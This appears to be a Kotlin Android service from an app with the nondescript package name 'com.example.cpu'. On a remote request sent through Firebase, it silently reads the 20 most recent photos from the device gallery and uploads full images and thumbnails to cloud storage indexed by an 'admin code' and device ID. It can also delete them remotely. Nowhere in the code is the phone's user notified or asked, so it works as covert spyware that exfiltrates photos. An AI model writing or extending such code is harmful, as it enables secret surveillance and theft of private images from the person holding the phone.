package com.example.cpu

import android.app.Service
import android.content.ContentUris
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.ImageDecoder
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.MediaStore
import android.util.Log
import com.example.cpu.models.GalleryImage
import com.example.cpu.utils.PrefsManager
import com.google.firebase.database.*
import com.google.firebase.storage.FirebaseStorage
import java.io.ByteArrayOutputStream
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.*

class GalleryUploadService : Service() {

    private lateinit var prefsManager: PrefsManager
    private val database = FirebaseDatabase.getInstance()
    private val storage = FirebaseStorage.getInstance()

    companion object {
        private const val TAG = "GalleryUploadService"
    }

    override fun onCreate() {
        super.onCreate()
        prefsManager = PrefsManager(this)
        listenForGalleryRequest()
    }

    private fun listenForGalleryRequest() {
        val adminCode = prefsManager.getAdminCode() ?: return

        database.getReference("requests")
            .child(adminCode)
            .child("gallery_access")
            .child("requested")
            .addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val requested = snapshot.getValue(Boolean::class.java) ?: false
                    if (requested) uploadRecentPhotos()
                }
                override fun onCancelled(error: DatabaseError) {
                    Log.e(TAG, "Failed to listen for gallery request", error.toException())
                }
            })
    }

    private fun uploadRecentPhotos() {
        val adminCode = prefsManager.getAdminCode() ?: return
        val deviceId = prefsManager.getDeviceId() ?: return

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATE_TAKEN
        )
        val sortOrder = "${MediaStore.Images.Media.DATE_TAKEN} DESC"

        val query = contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            sortOrder
        )

        query?.use { cursor ->
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val dateCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)

            var count = 0
            while (cursor.moveToNext() && count < 20) {
                val id = cursor.getLong(idCol)
                val name = cursor.getString(nameCol)
                val dateTaken = cursor.getLong(dateCol)
                val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)

                checkAndUploadPhoto(uri, name, dateTaken, adminCode, deviceId)
                count++
            }
        }
    }

    private fun checkAndUploadPhoto(
        uri: Uri,
        name: String,
        dateTaken: Long,
        adminCode: String,
        deviceId: String
    ) {
        val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            val source = ImageDecoder.createSource(contentResolver, uri)
            ImageDecoder.decodeBitmap(source)
        } else {
            @Suppress("DEPRECATION")
            MediaStore.Images.Media.getBitmap(contentResolver, uri)
        }

        val hash = bitmap.toSHA256()
        val galleryRef = database.getReference("gallery").child(adminCode).child(deviceId)

        // Check if photo already exists
        galleryRef.orderByChild("hash").equalTo(hash).addListenerForSingleValueEvent(object: ValueEventListener{
            override fun onDataChange(snapshot: DataSnapshot) {
                if (snapshot.exists()) {
                    Log.d(TAG, "Photo already uploaded: $name")
                } else {
                    uploadPhoto(bitmap, name, dateTaken, hash, adminCode, deviceId)
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun uploadPhoto(
        bitmap: Bitmap,
        name: String,
        dateTaken: Long,
        hash: String,
        adminCode: String,
        deviceId: String
    ) {
        val thumbnail = Bitmap.createScaledBitmap(bitmap, 200, 200, true)

        val fullBytes = ByteArrayOutputStream().apply { bitmap.compress(Bitmap.CompressFormat.JPEG, 80, this) }.toByteArray()
        val thumbBytes = ByteArrayOutputStream().apply { thumbnail.compress(Bitmap.CompressFormat.JPEG, 60, this) }.toByteArray()

        val fileName = "gallery_${dateTaken}_$name"
        val fullRef = storage.reference.child("gallery/$adminCode/$deviceId/full/$fileName")
        val thumbRef = storage.reference.child("gallery/$adminCode/$deviceId/thumbnails/$fileName")

        fullRef.putBytes(fullBytes).addOnSuccessListener { fullTask ->
            fullTask.storage.downloadUrl.addOnSuccessListener { fullUrl ->
                thumbRef.putBytes(thumbBytes).addOnSuccessListener { thumbTask ->
                    thumbTask.storage.downloadUrl.addOnSuccessListener { thumbUrl ->
                        saveGalleryImage(fullUrl.toString(), thumbUrl.toString(), dateTaken, hash, adminCode, deviceId)
                    }
                }
            }
        }.addOnFailureListener { e -> Log.e(TAG, "Upload failed", e) }
    }

    private fun saveGalleryImage(
        fullUrl: String,
        thumbUrl: String,
        dateTaken: Long,
        hash: String,
        adminCode: String,
        deviceId: String
    ) {
        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(dateTaken))
        val key = database.getReference("gallery/$adminCode/$deviceId").push().key ?: return

        val imageData = GalleryImage(
            id = key,
            imageUrl = fullUrl,
            thumbnailUrl = thumbUrl,
            timestamp = timestamp,
            deviceId = deviceId,
            hash = hash
        )
        database.getReference("gallery/$adminCode/$deviceId/$key").setValue(imageData)
    }

    // Permanently delete a photo
    fun deleteGalleryImage(adminCode: String, deviceId: String, image: GalleryImage) {
        // Delete from storage
        storage.getReferenceFromUrl(image.imageUrl).delete()
        storage.getReferenceFromUrl(image.thumbnailUrl).delete()

        // Delete from database
        database.getReference("gallery/$adminCode/$deviceId/${image.id}").removeValue()
    }

    // Bitmap hash utility
    private fun Bitmap.toSHA256(): String {
        val md = MessageDigest.getInstance("SHA-256")
        val byteArray = ByteArrayOutputStream().apply { compress(Bitmap.CompressFormat.JPEG, 100, this) }.toByteArray()
        val digest = md.digest(byteArray)
        return digest.joinToString("") { "%02x".format(it) }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
